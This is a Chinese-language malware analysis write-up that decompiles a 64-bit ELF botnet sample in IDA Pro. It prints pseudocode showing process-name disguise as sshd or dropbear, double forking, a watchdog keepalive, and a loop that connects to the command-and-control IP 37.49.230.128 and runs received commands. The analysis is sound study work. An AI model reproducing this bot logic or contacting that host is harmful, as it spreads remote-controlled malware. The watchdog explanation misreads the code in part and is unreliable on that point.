# 簡介
先前已經用IDA Pro 分析過 example_1 ，從本次的分析結果來看，該惡意程式依然是個殭屍病毒，基本的攻擊思路與 example_1 大致相同，都是利用 forking 來隱藏自己，隨後再連接到攻擊者的伺服器。
*  **樣本資料:**
    + sha256: 0b2a20aa35ad78f835614ae31a25b50c646aeb7bc7df3699b9b0d7c235cb8a22 
    + 64 bit 
    + elf 

# 使用步驟
* 將要分析的ELF檔用IDA Pro開啟會看到如下圖的架構圖，跟example_1比起來稍有不同

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/example_2%E6%9E%B6%E6%A7%8B%E5%9C%96.png)

* 按下F5後IDA Pro會自動反編譯成pseudocode 

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/example_2%E6%9E%B6%E6%A7%8B%E5%9C%96_%E7%B4%B0%E7%AF%80.png)

* 反編譯後的pseudocode 如下
```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  int v7; // ebx
  unsigned int v8; // eax
  int v9; // ebx
  unsigned int v10; // eax
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // ebx
  char v15; // [rsp+0h] [rbp-1120h]
  char v16[4096]; // [rsp+50h] [rbp-10D0h] BYREF
  __int64 v17[10]; // [rsp+1050h] [rbp-D0h] BYREF
  int v18; // [rsp+10A0h] [rbp-80h] BYREF
  char v19[4]; // [rsp+10A4h] [rbp-7Ch] BYREF
  const char *v20; // [rsp+10A8h] [rbp-78h]
  unsigned int v21; // [rsp+10B0h] [rbp-70h]
  __int64 v23; // [rsp+10B8h] [rbp-68h]
  int v24; // [rsp+10C0h] [rbp-60h]
  int i; // [rsp+10C4h] [rbp-5Ch]
  char *v26; // [rsp+10C8h] [rbp-58h]
  __int64 v27; // [rsp+10D0h] [rbp-50h]
  unsigned int j; // [rsp+10DCh] [rbp-44h]
  const char *k; // [rsp+10E0h] [rbp-40h]
  char *v30; // [rsp+10E8h] [rbp-38h]
  char *m; // [rsp+10F0h] [rbp-30h]
  int v32; // [rsp+10FCh] [rbp-24h]
  const char *v33; // [rsp+1100h] [rbp-20h]
  int n; // [rsp+110Ch] [rbp-14h]

  v20 = (const char *)&unk_412725;
  if ( (unsigned int)access("/usr/bin/python", 0LL, envp) == -1 )
    v20 = "/usr/sbin/dropbear";
  else
    v20 = "sshd";
  if ( !(unsigned int)geteuid() )
    userID = 0;
  strncpy(*argv, &unk_412725, strlen(*argv));
  sprintf((unsigned int)*argv, (_DWORD)v20, v3, v4, v5, v6);
  prctl(15LL, v20, 0LL, 0LL, 0LL);
  v7 = time(0LL);
  v8 = getpid();
  srandom(v7 ^ v8);
  v9 = time(0LL);
  v10 = getpid();
  init_rand(v9 ^ v10);
  getOurIP();
  table_init();
  v18 = 0;
  table_unlock_val(1LL);
  v23 = table_retrieve_val(1LL, &v18);
  write(1LL, v23, v18);
  write(1LL, "\n", 1LL);
  table_lock_val(1LL);
  watchdog_maintain();
  v21 = fork();
  if ( v21 )
  {
    waitpid(v21, v19, 0LL);
    exit(0);
  }
  if ( (unsigned int)fork() )
    exit(0);
  signal(13, 1LL);
  while ( 1 )
  {
    while ( (unsigned int)initConnection() )
      sleep(5LL);
    getBuild();
    sockprintf(KHcommSOCK, (unsigned int)"arch %s", (unsigned int)"x86", v11, v12, v13, v15);
    v24 = 0;
    i = 0;
    while ( 1 )
    {
      v24 = recvLine((unsigned int)KHcommSOCK, v16, 4096LL);
      if ( v24 == -1 )
        break;
      for ( i = 0; i < (unsigned __int64)numpids; ++i )
      {
        if ( (int)waitpid(*(unsigned int *)(4LL * i + pids), 0LL, 1LL) > 0 )
        {
          for ( j = i + 1; j < (unsigned __int64)numpids; ++j )
            *(_DWORD *)(4LL * (j - 1) + pids) = *(_DWORD *)(4LL * j + pids);
          *(_DWORD *)(4LL * (j - 1) + pids) = 0;
          --numpids;
          v27 = malloc(4 * numpids + 4);
          for ( j = 0; j < (unsigned __int64)numpids; ++j )
            *(_DWORD *)(v27 + 4LL * j) = *(_DWORD *)(4LL * j + pids);
          free(pids);
          pids = v27;
        }
      }
      v16[v24] = 0;
      trim(v16);
      v26 = v16;
      if ( v16[0] == 46 )
      {
        for ( k = v26 + 1; *k != 32 && *k; ++k )
          ;
        if ( *k )
        {
          *k = 0;
          k = v26 + 1;
          for ( v26 += strlen(v26 + 1) + 2;
                v26[strlen(v26) - 1] == 10 || v26[strlen(v26) - 1] == 13;
                v26[strlen(v26) - 1] = 0 )
          {
            ;
          }
          v30 = v26;
          while ( *v26 != 32 && *v26 )
            ++v26;
          *v26++ = 0;
          for ( m = v30; *m; ++m )
            *m = toupper((unsigned __int8)*m);
          v32 = 1;
          v33 = (const char *)strtok(v26, " ");
          v17[0] = (__int64)v30;
          while ( v33 )
          {
            if ( *v33 != 10 )
            {
              v14 = v32;
              v17[v14] = malloc(strlen(v33) + 1);
              memset((void *)v17[v32], 0, strlen(v33) + 1);
              strcpy(v17[v32++], v33);
            }
            v33 = (const char *)strtok(0LL, " ");
          }
          processCmd((unsigned int)v32, v17);
          if ( v32 > 1 )
          {
            for ( n = 1; n < v32; ++n )
              free(v17[n]);
          }
        }
      }
    }
  }
}
```

# 分析
從上述的 pseudocode 可以看出該惡意程式的運作大致能分為以下步驟
1. **初始化：**
  * 惡意軟件檢查/usr/bin/python系統上是否存在。如果不存在，則設置``v20``為/usr/sbin/dropbear，否則設置``v20``為sshd。
  * 它檢查有效用戶 ID 是否為 ``root (0)``。如果是，則將 設為``userID0``。
  *  它使用``strncpy``和``sprintf``將 process 的名稱修改為``sshd``或是 ``usr/sbin/dropbear``。
  *  調用該``prctl``函數來設置 process 的名稱，使其更難以在 process list 中檢測到。
2. **Watchdog：**
  * 它調用``watchdog_maintain()``，由於無法反編譯該副程式，這是一個確保惡意程式繼續運行並且不被終止的函數。
3. **Forking:：**
  * 該程序將自身分叉兩次。這是daemon和惡意程式用來將自身與終端分離並在後台運行的常用技術。其操作是將parent processes退出，child processes繼續運行。
4. **主程式：**
  * 該惡意軟件嘗試使用 建立連接``initConnection()``。如果失敗，則會等待 5 秒，然後重試。
  * 它開始利用``getBuild()``來收集有關受感染計算機的一些信息。
  * 然後，它使用``sockprintf()``將該信息（特別是X86架構）發送到遠程服務器。
  * 惡意軟件等待來自遠程服務器的命令。當收到命令時，它使用``processCmd()``處理該命令。
5. **Child process管理：**
  * 惡意軟件會跟踪它產生的 child process （可能用於執行命令）。它定期檢查這些子進程是否已退出並清理其資源。


# 細節分析
## initConnectioninitConnection
對著原本 pseudocode 中的`initConnection()`點兩下，即可看到該副程式的 pseudocode 

```
_BOOL8 initConnection()
{
  __int64 v0; // rax
  char v2[4108]; // [rsp+10h] [rbp-1010h] BYREF
  unsigned int v3; // [rsp+101Ch] [rbp-4h]

  memset(v2, 0LL, 4096LL);
  if ( KHcommSOCK )
  {
    close((unsigned int)KHcommSOCK);
    KHcommSOCK = 0;
  }
  if ( KHserverHACKER == 3 )
    KHserverHACKER = 0;
  else
    ++KHserverHACKER;
  szprintf(
    (unsigned int)v2,
    (unsigned int)"%d.%d.%d.%d",
    hacks[KHserverHACKER],
    hacks2[KHserverHACKER],
    hacks3[KHserverHACKER],
    hacks4[KHserverHACKER]);
  v3 = axis_bp;
  if ( strchr(v2, 58LL) )
  {
    v0 = strchr(v2, 58LL);
    v3 = atoi(v0 + 1);
    *(_BYTE *)strchr(v2, 58LL) = 0;
  }
  KHcommSOCK = socket(2LL, 1LL, 0LL);
  return (unsigned int)connectTimeout((unsigned int)KHcommSOCK, v2, v3, 30LL) == 0;
}
```

此時可看出攻擊者的IP會存在``hacks``, ``hacks2``, ``hacks3``, 與 ``hacks4``等4個數組中
點進去後可以發現，其ip其實就是`37.49.230.128`

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/hacks.png)

## watchdog_maintain()
```
__int64 watchdog_maintain()
{
  __int64 result; // rax
  int val; // eax
  int v2; // edx
  int v3; // ecx
  int v4; // r8d
  int v5; // r9d
  int v6; // ecx
  int v7; // r8d
  int v8; // r9d
  int v9; // eax
  int v10; // edx
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // [rsp+4h] [rbp-Ch] BYREF
  int v15; // [rsp+8h] [rbp-8h]
  int v16; // [rsp+Ch] [rbp-4h]

  watchdog_pid = fork();
  result = (unsigned int)watchdog_pid;
  if ( watchdog_pid <= 0 )
  {
    result = (unsigned int)watchdog_pid;
    if ( watchdog_pid != -1 )
    {
      v14 = 1;
      v16 = 0;
      table_unlock_val(15LL);
      table_unlock_val(16LL);
      val = table_retrieve_val(15LL, 0LL);
      v15 = open(val, 2, v2, v3, v4, v5);
      if ( v15 != -1 || (v9 = table_retrieve_val(16LL, 0LL), v15 = open(v9, 2, v10, v11, v12, v13), v15 != -1) )
      {
        v16 = 1;
        ioctl(v15, -2147199228, (unsigned int)&v14, v6, v7, v8);
      }
      if ( v16 )
      {
        while ( 1 )
        {
          ioctl(v15, -2147199227, 0, v6, v7, v8);
          sleep(10LL);
        }
      }
      table_lock_val(15LL);
      table_lock_val(16LL);
      exit(0);
    }
  }
  return result;
}
```

其運作原理大致可分為三個步驟
1. **Forking:**
    - 該函數首先調用fork()，這會創建一個 child process。隨後把 child process 的 ID 存儲在watchdog_pid。
2. **Child process的運作邏輯:**
    - 如果`watchdog_pid`為0，則表示當前代碼在child process中運行。
    - Child process 使用`table_unlock_val()`進行一系列操作。
    - Child process 執行完操作後，使用`table_lock_val()`鎖定表中的值，然後退出。
3. **Parent process的運作邏輯:**
    - 如果`watchdog_pid`大於 0，則代碼在Parent process中運行，並且該`watchdog_maintain`僅返還 child process 的 ID。
    - 如果`watchdog_pid`d為-1，則表明操作過程中發生錯誤`fork()`，`watchdog_maintain`則不做任何進一步的操作。










